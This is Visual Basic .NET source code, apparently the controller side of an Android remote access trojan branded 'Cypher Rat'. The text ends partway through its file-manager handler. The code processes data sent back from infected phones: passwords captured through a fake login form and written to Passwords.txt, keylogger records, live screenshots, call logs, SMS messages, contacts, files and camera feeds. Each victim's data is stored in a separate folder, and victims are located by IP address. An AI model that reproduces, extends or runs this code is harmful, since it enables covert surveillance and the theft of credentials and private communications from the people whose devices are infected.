Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net.Sockets
Imports WinMM
'------------------------------------
'---------Cypher Rat By EVLF
'-----------------------------------
'---------t.me/evlfdev
'------------------------------------
Namespace sockets
    Public NotInheritable Class Data
         Private Shared inv As String = "invalid license"
         Public Shared SyncWorkerRemove As Object = New Object()
         Public Shared ActiveClient As Collection = New Collection
         Public Shared SyncClientsOnline As Object = New Object()
         Public Shared SyncRequestsReceiver As Object = New Object()
         Public Shared SyncListWorker As Object = New Object()
         Public Shared SyncWorkerRequests As Object = New Object()
         Public Shared SyncNotifications As Object = New Object()
         Public Shared SPL_SOCKET, SPL_DATA, SPL_LINE, SPL_ARRAY As String
         Public Shared angelform As CypherRat
         Public Shared GeoIP0 As GeoIP
         Public Shared password As String = ""
         Public Shared imageFlags As New ImageList()
         Public Shared nReport As Report
         Public Shared Thumbs As String = reso.res_Path & "\Thumbs"
         Private Shared imageListLarge As New Collection
         Public Shared Filenamethum As String
         Public Shared aboutdata As String() = Nothing
        Public Shared label1data As String = Nothing

        Public Shared Cameraison As Boolean = False
         Public Shared THEKEY As String = WHTK()
         Public Shared JK As String = JKS()
         Public Shared Function JKS() As String
            Return "BSN12345678901234567"
        End Function
        Public Shared Function WHTK() As String
            Return "Nagato"
        End Function
         Shared Sub New()
             Dim filepathps = Environment.CurrentDirectory.ToString & "\res\Config\Pass.inf"
             imageListLarge = New Collection
             Try
agin:
                If Not File.Exists(filepathps) Then
                    File.WriteAllText(filepathps, Encrypt("X0X0X", THEKEY))
                End If
                 Dim list = File.ReadAllLines(filepathps)
                If list.GetValue(0).ToString.Length < 3 Then
                    File.WriteAllText(filepathps, Encrypt("X0X0X", THEKEY))
                    password = Codes.Decrypt(Encrypt("X0X0X", THEKEY), THEKEY)
                Else
                    password = Codes.Decrypt(list.GetValue(0).ToString, THEKEY)
                End If
            Catch ex As Exception
                File.WriteAllText(filepathps, Encrypt("X0X0X", THEKEY))
                GoTo agin
            End Try
             SecurityKey.Createkeys()
             Data.nReport = New Report()
             Data.nReport.Show()
             Data.GeoIP0 = New GeoIP(reso.res_Path & "\GeoIP\GeoIP.dat")
             Data.SPL_SOCKET = password
             Data.SPL_DATA = "x0D0x"
             Data.SPL_LINE = "x0L0x"
             Data.SPL_ARRAY = "x0A0x"
 #Region " imageList Flags "
             Dim b As Boolean = False
             Dim Files_List_Flag As String() = IO.Directory.GetFiles(reso.res_Path & "\GeoIP\Flags")
             Dim i As String
             For Each i In Files_List_Flag
                 If b = False Then
                     If SpySettings.FLAGS_Size = "32px" Then
                         imageFlags.ImageSize = New Size(32, 32)
                     ElseIf SpySettings.FLAGS_Size = "24px" Then
                         imageFlags.ImageSize = New Size(24, 24)
                     Else
                         imageFlags.ImageSize = New Size(16, 16)
                     End If
                     imageFlags.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
                     b = True
                 End If
                 Dim FilePath As String = i
                 Dim directoryPath As String = IO.Path.GetFileNameWithoutExtension(FilePath)
                 imageFlags.Images.Add(directoryPath.ToUpper, Bitmap.FromFile(i))
             Next
#End Region
         End Sub
         Public Shared Function Dir(ByVal uuid As String) As String
             Dim FolderALL As String = reso.res_Path & "\" & reso.users
             Dim FolderUSER As String = FolderALL & "\" & uuid
             If Not IO.Directory.Exists(FolderALL) Then
                 IO.Directory.CreateDirectory(FolderALL)
             End If
             If Not IO.Directory.Exists(FolderUSER) Then
                 IO.Directory.CreateDirectory(FolderUSER)
             End If
             Return FolderUSER
         End Function
         Public Shared Sub LOGIT(Client As Client, Status As String)
            If My.Settings.LOG = "Yes" Then
                Dim ip As String = Client.ClientAddressIP
                If Status = "New Client" Then
                    SyncLock ActiveClient
                        If Not ActiveClient.Contains(ip) Then
                             ActiveClient.Add(New Object() {ip}, ip, Nothing, Nothing)
                            angelform.addLog(New Object() {GetFlagThisIp.ThisIp(ip), ip, GetCountryName.GetCountryName(ip), Status})
                            Return
                        Else
                            Return
                        End If
                    End SyncLock
                 End If
                If ip = "Error" Then
                    angelform.addLog(New Object() {GetFlagThisIp.ThisIp(ip), ip, " ", Status, " "})
                    Return
                End If
                angelform.addLog(New Object() {GetFlagThisIp.ThisIp(ip), ip, GetCountryName.GetCountryName(ip), Status})
             End If
        End Sub
         Public Delegate Sub Delegatex(ByVal ParametersObject As Object)
        Public Shared Async Sub Data_0Async(ByVal ParametersObject As Object)
             If DirectCast(Data.angelform, Windows.Forms.Control).IsDisposed Then
                 Exit Sub
             Else
                 Dim ClassClient As sockets.Client = DirectCast(ParametersObject(0), sockets.Client)
                 Dim bByte As Byte() = DirectCast(ParametersObject(1), Byte())
                 Dim SizeData As Array = DirectCast(ParametersObject(2), Array)
                 Dim Client As Net.Sockets.TcpClient = CType(ParametersObject(3), Net.Sockets.TcpClient)
                      Dim SPLByte As Array
                Dim EncodString As String
                Dim getCase As String
                Dim thesizes As String
                Try
                     SPLByte = Codes.SplitByte(bByte, SizeData)
                     EncodString = Codes.Encoding().GetString(SPLByte.GetValue(0))
                     getCase = If(EncodString.Contains(Data.SPL_ARRAY), EncodString.Split({Data.SPL_ARRAY}, StringSplitOptions.None)(0), EncodString) 'fix
                 Catch ex As Exception
                     LOGIT(ClassClient, "Known Rat (Spynote,Njrat,....)")
                    ClassClient.Close(Client, "Known Rat")
                    Exit Sub
                End Try
                If getCase.Trim = "-0" Then
                    getCase = "-255"
                End If
                If getCase.StartsWith("-9") Then
                    thesizes = getCase
                    getCase = "-9"
                End If
                 Select Case getCase.Trim
                     Case "-A"
                         Try
                            Dim THEDATA As String = CStr(Codes.Encoding().GetString(SPLByte.GetValue(1)))
                             ClassClient.ActiveNow = THEDATA
                        Catch ex As Exception
                         End Try
                        Return
                     Case CStr(reso.plug.Count)
                         Try
                            ClassClient.Keys = Codes.Encoding().GetString(SPLByte.GetValue(1))
                            Dim getKey As String() = ClassClient.Keys.Split(":")
                            Dim obj As Object() = {Client, KeysClient1 & Data.SPL_SOCKET & reso.domen & ".info" & Data.SPL_SOCKET & "method" & Data.SPL_SOCKET & SecurityKey.getinfo & Data.SPL_SOCKET & "info" & Data.SPL_DATA & getKey(2) & Data.SPL_DATA & getKey(5), Codes.Encoding().GetBytes("null"), ClassClient}
                            ClassClient.SendAsync(obj)
                        Catch ex As Exception
                         End Try
                         Return
                     Case "-666"
                         Try
                            Dim THEDATA As String = CStr(Codes.Encoding().GetString(SPLByte.GetValue(1)))
                            reso.FormatNotifi(THEDATA, ClassClient)
                            ClassClient.Card.UpdateValue()
                        Catch ex As Exception
                         End Try
                        Return
                     Case "-44"
                         Try
                             If ClassClient.qit = True Then
                                 Return
                             End If
                             Dim handle As String = "SM_Hunter_" & ClassClient.ClientAddressIP
                             Dim Faker As Faker = My.Application.OpenForms(handle)
                             If Faker Is Nothing Then
                                 Return
                             Else
                                Dim THEDATA As String = CStr(Codes.Encoding().GetString(SPLByte.GetValue(1)))
                                Dim objects As Object() = reso.formatPasses(THEDATA)
                                Faker.DataGridView1.Rows.Add(objects(0), objects(1), objects(2))
                                File.AppendAllText(Faker.DownloadsFolder & "\Passwords.txt", vbNewLine & "->" & objects(0) & " UserName:" & objects(1) & " Password:" & objects(2))
                            End If
                         Catch ex As Exception
                         End Try
                         Return
                     Case "-9"
                        Try

                            If ClassClient.qit = True Then

                                Return

                            End If
                            Dim screensize As String() = thesizes.Split(":")
                            Dim mytargetfromid As String = ClassClient.ClientAddressIP
                            Dim newupdate As Boolean = False
                            If screensize.Length = 4 Then
                                mytargetfromid = screensize(3)
                                newupdate = True
                            End If
                            Dim handle As String = "Live_Screen_" & mytargetfromid

                            Dim Screener As ScreenShoter = My.Application.OpenForms(handle)

                            If Screener Is Nothing AndAlso newupdate Then
                                ' ClassClient.Close(Client, "")
                                Dim ob As Object() = Data.GetCollection(mytargetfromid, ClassClient)

                                If ob(0) IsNot Nothing Then
                                    Dim targetclient As sockets.Client = DirectCast(ob(0), sockets.Client)

                                    Screener = New ScreenShoter

                                    Screener.Name = handle

                                    Screener.Title = String.Format("{0} - IP:{1}", "Live Screen", ClassClient.ClientAddressIP)

                                    Screener.Tag = targetclient.ClientAddressIP

                                    Screener.classClient = targetclient

                                    Screener.Client = targetclient.myClient

                                    Screener.DownloadsFolder = targetclient.FolderUSER

                                    DirectCast(Screener, Control).Show()
                                Else

                                    Screener = Nothing
                                End If

                            End If
                            If Screener Is Nothing Then
                                Dim fix = ClassClient.ClientAddressIP.Split(".")
                                Dim newidf = fix(0) + "." + fix(1)
                                For Each Formt As Form In Application.OpenForms
                                    Try
                                        If Formt.Tag.ToString.StartsWith(newidf) Or Formt.Name.Contains(newidf) Then
                                            Screener = DirectCast(Formt, ScreenShoter)
                                            Screener.Name = handle

                                            Screener.Title = String.Format("{0} - IP:{1}", "Live Screen", ClassClient.ClientAddressIP)

                                            Screener.Tag = ClassClient.ClientAddressIP


                                            Exit For
                                        End If
                                    Catch ex As Exception

                                    End Try
                                Next


                            End If
                            If Screener Is Nothing Then
                                ClassClient.Close(ClassClient.myClient, "")
                                Return
                            End If

                            'Screener.Done(New Object() {"Connected"})

                            'If Not Screener.refreshtimer.Enabled Then
                            '    Screener.refreshtimer.Enabled = True
                            'End If

                            'Screener.Rnew += 1
                            'Screener.ScreenClass = ClassClient
                            'Screener.Alive = True
                            Dim Byte_ As Byte() = DirectCast(SPLByte.GetValue(1), Byte())

                            Dim MS As New IO.MemoryStream(Byte_)

                            Dim bmp As Bitmap = Image.FromStream(MS)


                            Screener.PictureBox1.Image = Codes.AddWatermark(bmp, "© t.me/evlfdev")

                            If ClassClient.ScreenSize = Nothing Or Screener.ScreenSize = Nothing Then

                                Try

                                    If IsNumeric(screensize(1)) AndAlso IsNumeric(screensize(2)) Then
                                        Dim phone_hight As Integer = CInt(screensize(1))
                                        Dim phone_width As Integer = CInt(screensize(2))

                                        ClassClient.ScreenSize = New Size(phone_width, phone_hight)
                                        'Screener.PictureBox1.Size = ClassClient.ScreenSize

                                        Screener.ScreenSize = ClassClient.ScreenSize
                                    Else

                                        ClassClient.ScreenSize = New Size(720, 1280)
                                    End If


                                Catch ex As Exception

                                End Try
                            End If





                        Catch ex As Exception

                        End Try
                        Return

                    Case "-5"
                        Try
                            Dim THEDATA As String = CStr(Codes.Encoding().GetString(SPLByte.GetValue(1)))
                            ClassClient.CALLS = reso.FormatCALL(THEDATA)
                        Catch ex As Exception
                         End Try
                        Return
                     Case "888"
                         Try
                            Dim SPL As String = CStr(Codes.Encoding().GetString(SPLByte.GetValue(1)))
                             Dim handle As String = "Keylogger_" & ClassClient.ClientRemoteAddress
                             Dim keylogg As Keylogger = My.Application.OpenForms(handle)
                             If keylogg IsNot Nothing Then
                                 Dim base64log As String() = SPL.Split(">")
                                 If base64log.Length > 0 Then
                                    Try
                                        For Each log In base64log
                                             Dim rsult As String = Codes.BSDE(log)
                                            Dim dat As String() = rsult.Split("#")
                                            keylogg.Done(New Object() {Codes.AccessibilityEvent(CInt(dat(2))), dat(0), dat(1)})
                                         Next
                                    Catch ex As Exception
                                     End Try
                                        End If
                             End If
                        Catch ex As Exception
                         End Try
                        Return
                     Case "-255"
                          Try
                            If ClassClient IsNot Nothing Then
                                  Dim DataStatistics As String = CStr(Codes.Encoding().GetString(SPLByte.GetValue(1)))
                                 Dim SCREEN As Boolean = If(DataStatistics = "25", True, False)
                                 If SCREEN Then
                                     GoTo H
                                 End If
                                If DataStatistics.Trim.Length = 0 And DataStatistics.Length = 1 Then '\t Final warning ' 45s
                                     Dim Obj As Object() = {Client, SecurityKey.SHOT, Codes.Encoding().GetBytes(SecurityKey.SHOT), ClassClient}
                                     ClassClient.SendAsync(Obj) ' +
                                Else
                                    If DataStatistics.Length > 1 Then
                                         Dim ar As String() = Codes.GetStatistics(DataStatistics)
                                         If Not ar(0).Length = 0 And Not ar(1).Length = 0 Then
                                             ClassClient.Statistics = String.Format("{0} ms", ar(0))
                                            If ClassClient.Card IsNot Nothing Then
                                                ClassClient.Card.UpdateValue()
                                             End If
                                        End If
                                     End If
                                End If
 H:
                                 If SCREEN Then
                                     Dim obj_Upd As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getUpdate & sockets.Data.SPL_SOCKET & "update", Codes.Encoding().GetBytes("null"), ClassClient}
                                     ClassClient.SendAsync(obj_Upd)
                                 Else
                                     If ClassClient.Card Is Nothing Then
                                        If ClassClient.CountPoing >= 2 Then ' 45000 *2  
                                            ClassClient.CountPoing = -1
                                             Dim objs As Object() = {Client, SecurityKey.KeysClient11 & sockets.Data.SPL_SOCKET & "null", Codes.Encoding().GetBytes("null"), ClassClient}
                                            ClassClient.SendAsync(objs)
                                            ClassClient.CountPoing = 0
                                        Else
                                            ClassClient.CountPoing += 1
                                        End If
                                    Else
                                        ClassClient.CountPoing = 0
                                    End If
                                 End If
                             End If
                         Catch ex As Exception
                         End Try
                            Return
                     Case "-1"
                          ClassClient.Keys = Codes.Encoding().GetString(SPLByte.GetValue(1))
                        Dim injection As String = Data.SPL_SOCKET & SecurityKey.KeysClient1 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient2 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient3 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient4 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient5 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient6 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient7 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient8 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient9 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient10 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient11 _
                            & Data.SPL_SOCKET & SecurityKey.KeysGetClient _
                            & Data.SPL_SOCKET & SecurityKey.resultClient
                         If reso.plug.Count > 0 Then
                             For Each pl In reso.plug
                                 Dim plg As Array = DirectCast(pl, Array)
                                 Dim obj As Object() = {Client, "0" & Data.SPL_SOCKET & plg(0) & Data.SPL_SOCKET & plg(1) & Data.SPL_SOCKET & plg(2) & Data.SPL_SOCKET & plg(3) & Data.SPL_SOCKET & plg(5) & injection, plg(4), ClassClient, True}
                                 ClassClient.SendAsync(obj)
                             Next
                         End If
                         Return
                     Case SecurityKey.KeysGetClient
                         Dim getKey As String() = ClassClient.Keys.Split(":")
                         Dim obj As Object() = {Client, SecurityKey.KeysClient1 & Data.SPL_SOCKET & reso.domen & ".info" & Data.SPL_SOCKET & "method" & Data.SPL_SOCKET & SecurityKey.getinfo & Data.SPL_SOCKET & "info" & Data.SPL_DATA & getKey(2) & Data.SPL_DATA & getKey(5), Codes.Encoding().GetBytes("null"), ClassClient}
                         ClassClient.SendAsync(obj)
                         Return
                 End Select
                 If Data.angelform.InvokeRequired Then
                     Data.angelform.Invoke(New Delegatex(AddressOf Data.Data_0Async), New Object() {ParametersObject})
                     Exit Sub
                 Else
                     Select Case getCase.Trim
                         Case SecurityKey.getCamera
                            StartCamer(ClassClient, EncodString, SPLByte, Client)
                        Case SecurityKey.getUpdate
                             Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                 ClassClient.Wallpaper(0) = reso.Wallpaper(SPL(1), reso.IconsSize, reso.IconsSize, ClassClient)
                                  reso.SetScreen(SPL(2), ClassClient)
                                 If SPL(3) IsNot Nothing Then
                                    ClassClient.BatteryCharge = SPL(3)
                                    If ClassClient.BatteryCharge.EndsWith("t") Then
                                        ClassClient.BatteryCharge = ClassClient.BatteryCharge.Replace("t", "")
                                        ClassClient.Battery = My.Resources.chrg
                                    Else
                                        SetBattery(ClassClient)
                                    End If
                                 Else
                                    ClassClient.BatteryCharge = "Unkown"
                                End If
                                 If SPL(4) IsNot "-1" Then
                                    Select Case SPL(4)
                                        Case "1"
                                            ClassClient.Wifi = My.Resources.wifi
                                        Case "0"
                                            ClassClient.Wifi = My.Resources._3g
                                        Case Else
                                     End Select
                                End If
                                 ClassClient.Wallpaper(1) = SPL(1)
                                 If ClassClient.Card IsNot Nothing Then
                                     ClassClient.Card.ProfilePic.Image = ClassClient.Wallpaper(0)
                                    ClassClient.Card.PhoneScreenPic.Image = ClassClient.Screen
                                 End If
                             Catch ex As Exception
                             End Try
                         Case SecurityKey.getinfo
                             If ClassClient.Card Is Nothing Then
                                 Try
                                      Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                     Dim getKEY As String() = ClassClient.Keys.Split(":")
                                     ClassClient.Flag = GetFlagThisIp.ThisIp(ClassClient.ClientAddressIP)
                                     ClassClient.Country = GetCountryName.GetCountryName(ClassClient.ClientAddressIP)
                                     Dim identifiers As String() = SPL(5).Split("|")
                                    ClassClient.ClientName = identifiers(0)
                                    ClassClient.UUID = identifiers(1)
                                         If SPL(1).EndsWith(" ") Then
                                        SPL(1) = SPL(1).Substring(0, SPL(1).Length - 1)
                                    End If
                                     ClassClient.FolderUSER = Dir(ClassClient.ClientName + "-" + ClassClient.UUID)
                                     ClassClient.host = getKEY(6)
                                      ClassClient.VersionClient = reso.GetVersionClient(getKEY)
                                         ClassClient.Wallpaper(0) = reso.Wallpaper(SPL(8), reso.IconsSize, reso.IconsSize, ClassClient)
                                    reso.SetScreen(SPL(9), ClassClient)
                                    ClassClient.Wallpaper(1) = SPL(8)
                                     If SPL(10) IsNot Nothing Then
                                        ClassClient.BatteryCharge = SPL(10)
                                        If ClassClient.BatteryCharge.EndsWith("t") Then
                                            ClassClient.BatteryCharge = ClassClient.BatteryCharge.Replace("t", "")
                                            ClassClient.Battery = My.Resources.chrg
                                         Else
                                            ClassClient.BatteryCharge = ClassClient.BatteryCharge.Replace("f", "")
                                            SetBattery(ClassClient)
                                         End If
                                    Else
                                        ClassClient.BatteryCharge = "Unkown"
                                    End If
                                     If SPL(11) IsNot "-1" Then
                                        Select Case SPL(11)
                                            Case "1"
                                                ClassClient.Wifi = My.Resources.wifi
                                            Case "0"
                                                ClassClient.Wifi = My.Resources._3g
                                            Case Else
                                         End Select
                                    End If
                                     ClassClient.ClientDefender = SPL(7)
                                    ClassClient.CALLS = "null"
                                     reso.Directory_Exist(ClassClient)
                                    ClassClient.android = SPL(3)
                                      Dim o As Object() = {ClassClient, Client}
                                     If ClassClient.EXI = True Then
                                         Return
                                     End If
                                     Dim ID As ClientCard
                                    Dim arrayObjects As Object()
                                    Dim objs As Object()
                                    Dim flag As Boolean
                                     If OLDCARD(ClassClient.UUID) Then
                                        Dim OldCard As ClientCard = GetOldCard(ClassClient.UUID)
                                        If OldCard IsNot Nothing Then
                                             ClassClient.Card = OldCard
                                            OldCard.ClassClient = ClassClient
                                            ClassClient.isready = True
                                            OldCard.ClassClient.Statistics = "Reset"
                                             angelform.UpdateForms(OldCard)
                                             Return
                                        Else
                                            LOGIT(ClassClient, "UPDATE OLD CLIENT:FAILD")
                                            GoTo Fix
                                         End If
                                     End If
Fix:
                                    arrayObjects = AddCard(ClassClient.UUID, ClassClient)
                                     ID = arrayObjects(0)
                                    flag = CBool(arrayObjects(1))
                                     objs = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".apps" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "load" & sockets.Data.SPL_DATA & "n", Codes.Encoding().GetBytes("null"), ClassClient}
                                     ClassClient.SendAsync(objs)
                                    ClassClient.isready = True
                                     If Not ID Is Nothing Then
                                           angelform.UpdateForms(ClassClient.Card)
                                        If Not flag Then
                                             If SpySettings.SOHW_ALERT = "Yes" Then
                                                 If Not DirectCast(Data.nReport, Control).IsDisposed Then
                                                      Dim aString As String = "New Client " & vbNewLine & "IP: " & "{2}" & vbNewLine & "Country : " & "{3}" & vbNewLine & "Name: " & "{1}"
                                                    Data.nReport.AddItem(ClassClient.Wallpaper(0), String.Format(aString, ClassClient.Country, ClassClient.ClientName, ClassClient.ClientAddressIP, ClassClient.Country))
                                                 End If
                                             End If
                                         End If
                                     End If
                                 Catch ex As Exception
                                     Try
                                         If Not ClassClient Is Nothing Then
                                             Dim objs As Object() = {Client, SecurityKey.KeysClient5 & sockets.Data.SPL_SOCKET & "5000", Codes.Encoding().GetBytes("null"), ClassClient}
                                             ClassClient.Card = Nothing
                                             ClassClient.SendAsync(objs)
                                         End If
                                     Catch skip As Exception
                                     End Try
                                 End Try
                            Else
                             End If
                         Case SecurityKey.getCalls
                             Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                 Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)
                                 Dim handle As String = "Calls_Manager_" & ClassClient.ClientRemoteAddress
                                 Dim CallsManager As CallsManager = My.Application.OpenForms(handle)
                                 If CallsManager Is Nothing Then
                                     CallsManager = New CallsManager
                                     CallsManager.Name = handle
                                     CallsManager.Title = String.Format("{0} - IP:{1}", "Calls Manager", ClassClient.ClientAddressIP)
                                     CallsManager.Client = Client
                                     CallsManager.classClient = ClassClient
                                     CallsManager.tmpAddressIP = ClassClient.ClientAddressIP
                                     CallsManager.tmpClientName = ClassClient.ClientName
                                     CallsManager.tmpCountry = ClassClient.Country
                                     CallsManager.tmpFolderUSER = ClassClient.FolderUSER
                                     CallsManager.DGV0.Columns(5).Width = reso.IconsSize
                                     CallsManager.DGV0.Columns(5).DisplayIndex = 0
                                     DirectCast(CallsManager, Control).Show()
                                 End If
                                 CallsManager.DGV0.Enabled = False
                                 CallsManager.DGV0.Rows.Clear()
                                 Dim Counter As Integer = 0
                                 For Each ea In SPL_lines
                                     Dim ay As String() = ea.Split({SPL_ARRAY}, StringSplitOptions.None)
                                     Dim getPath As String = Nothing
                                    Select Case ay(2)
                                        Case "Incoming"
                                            getPath = reso.res_Path & "\Icons\FillEllipse\Incoming.png"
                                        Case "Outgoing"
                                            getPath = reso.res_Path & "\Icons\FillEllipse\Outgoing.png"
                                        Case "Missed"
                                            getPath = reso.res_Path & "\Icons\FillEllipse\Missed.png"
                                        Case Else
                                            getPath = reso.res_Path & "\Icons\FillEllipse\null.png"
                                    End Select
                                     Dim id As Integer = CallsManager.DGV0.Rows.Add(ay(0), ay(1), ay(2), ay(3), Codes.Duration(ay(4)), reso.GetEllImage(0, {getPath, 15, 15, 17, 17}))
                                     CallsManager.DGV0.Rows(id).Tag = ay(5)
                                     CallsManager.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)
                                     Counter += 1
                                     Application.DoEvents()
                                 Next
                                 CallsManager.DGV0.Enabled = True
                                 CallsManager.PB.Value = 0
                                 If SpySettings.SAVING_DATA = "Yes" Then
                                    reso.Directory_Exist(ClassClient)
                                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {CallsManager.DGV0, ClassClient.FolderUSER, "Calls Manager",
                                        ClassClient.ClientName, ClassClient.Country & " - " & ClassClient.ClientAddressIP, "Call Log", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
                                End If
                             Catch ex As Exception
                             End Try
                        Case SecurityKey.getSMS
                             Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                 Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)
                                 Dim handle As String = "SMS_Manager_" & ClassClient.ClientRemoteAddress
                                 Dim SMSManager As SMSManager = My.Application.OpenForms(handle)
                                 If SMSManager Is Nothing Then
                                     SMSManager = New SMSManager
                                     SMSManager.Name = handle
                                     SMSManager.Title = String.Format("{0} - IP:{1}", "SMS Manager", ClassClient.ClientAddressIP)
                                     SMSManager.Client = Client
                                     SMSManager.classClient = ClassClient
                                     SMSManager.tmpAddressIP = ClassClient.ClientAddressIP
                                     SMSManager.tmpClientName = ClassClient.ClientName
                                     SMSManager.tmpCountry = ClassClient.Country
                                     SMSManager.tmpFolderUSER = ClassClient.FolderUSER
                                     SMSManager.DGV0.Columns(5).Width = reso.IconsSize
                                     SMSManager.DGV0.Columns(5).DisplayIndex = 0
                                     DirectCast(SMSManager, Control).Show()
                                 End If
                                 SMSManager.DGV0.Enabled = False
                                 SMSManager.DGV0.Rows.Clear()
                                 Dim path As String = Nothing
                                 Dim Counter As Integer = 0
                                 For Each ea In SPL_lines
                                     Dim ay As String() = ea.Split({SPL_ARRAY}, StringSplitOptions.None)
                                     Dim idRow As Integer = SMSManager.DGV0.Rows.Add(ay(0), ay(1), ay(2), ay(3), ay(5), reso.GetEllImage(1, {ay(1), ay(0), "<->", Nothing, Nothing}))
                                     SMSManager.DGV0.Rows(idRow).Tag = ay(4)
                                     path = ay(5)
                                     SMSManager.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)
                                     Counter += 1
                                     Application.DoEvents()
                                 Next
                                 SMSManager.DGV0.Enabled = True
                                 SMSManager.PB.Value = 0
                                 If SpySettings.SAVING_DATA = "Yes" Then
                                    reso.Directory_Exist(ClassClient)
                                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {SMSManager.DGV0, ClassClient.FolderUSER, "SMS Manager",
                                        ClassClient.ClientName, ClassClient.Country & " - " & ClassClient.ClientAddressIP, "SMS", "sms", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
                                End If
                             Catch ex As Exception
                             End Try
                        Case SecurityKey.getContacts
                             Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                 Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)
                                 Dim handle As String = "Contacts_Manager_" & ClassClient.ClientRemoteAddress
                                 Dim ContactsManager As ContactsManager = My.Application.OpenForms(handle)
                                 If ContactsManager Is Nothing Then
                                     ContactsManager = New ContactsManager
                                     ContactsManager.Name = handle
                                     ContactsManager.Title = String.Format("{0} - IP:{1}", "Contacts Manager", ClassClient.ClientAddressIP)
                                     ContactsManager.Client = Client
                                     ContactsManager.classClient = ClassClient
                                     ContactsManager.tmpAddressIP = ClassClient.ClientAddressIP
                                     ContactsManager.tmpClientName = ClassClient.ClientName
                                     ContactsManager.tmpCountry = ClassClient.Country
                                     ContactsManager.tmpFolderUSER = ClassClient.FolderUSER
                                     ContactsManager.DGV0.Columns(3).Width = reso.IconsSize
                                     ContactsManager.DGV0.Columns(3).DisplayIndex = 0
                                     DirectCast(ContactsManager, Control).Show()
                                 End If
                                 ContactsManager.DGV0.Enabled = False
                                 ContactsManager.DGV0.Rows.Clear()
                                 Dim Counter As Integer = 0
                                 For Each ea In SPL_lines
                                     Dim ay As String() = ea.Split({SPL_ARRAY}, StringSplitOptions.None)
                                     Dim id As Integer = ContactsManager.DGV0.Rows.Add(ay(0), ay(1), ay(2), reso.GetEllImage(1, {ay(0), Nothing, Nothing, Nothing, Nothing}))
                                     ContactsManager.DGV0.Rows(id).Tag = ay(3)
                                     ContactsManager.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)
                                     Counter += 1
                                     Application.DoEvents()
                                 Next
                                 ContactsManager.DGV0.Enabled = True
                                 ContactsManager.PB.Value = 0
                                 If SpySettings.SAVING_DATA = "Yes" Then
                                    reso.Directory_Exist(ClassClient)
                                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {ContactsManager.DGV0, ClassClient.FolderUSER, "Contacts Manager",
                                        ClassClient.ClientName, ClassClient.Country & " - " & ClassClient.ClientAddressIP, "Contacts", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
                                End If
                             Catch ex As Exception
                             End Try
                         Case SecurityKey.getfiles
                             Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)
                                 Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)
                                 Dim handle As String = "File_Manager_" & ClassClient.ClientAddressIP
                                 Dim FileManager As FileManager = My.Application.OpenForms(handle)
                                 If FileManager Is Nothing Then
                                     FileManager = New FileManager
                                     FileManager.Tag = ClassClient.ClientAddressIP
                                     FileManager.Name = handle
                                     FileManager.Title = String.Format("{0} - IP:{1}", "File Manager", ClassClient.ClientAddressIP)
                                     FileManager.Client = Client
                                     FileManager.classClient = ClassClient
                                     FileManager.ver = ClassClient.VersionClient
                                     FileManager.DGV0.AutoGenerateColumns = False
                                     FileManager.DGV0.Columns(5).DisplayIndex = 0
                                      FileManager.Show()
                                End If
                                 FileManager.DGV0.Enabled = False
                                 FileManager.Button7.Enabled = False
                                 FileManager.PB.BringToFront()
                                 FileManager.DGV0.Rows.Clear()
                                 Dim idx As Integer = FileManager.DGV0.Rows.Add("..", Nothing, Nothing, Nothing, Nothing, getIconFrmReg.GetIcon(reso.res_Path, If(SpySettings.FM_IC_Size = "Large", True, False)))
                                 FileManager.DGV0.Rows(idx).Cells(0).Tag = "back"
                                 Dim Counter As Integer = 0
                                 For Each ea In SPL_lines
                                     Dim ay As String() = ea.Split({SPL_ARRAY}, StringSplitOptions.None)
                                     If ay(0) = "-1" Then
                                         FileManager.DGV0.Tag = ay(1)
                                         Exit For
                                     End If
                                     FileManager.DGV0.Tag = ay(4)
                                     Dim exType As String = "n/a"
                                     If ay(1) = "0" Then
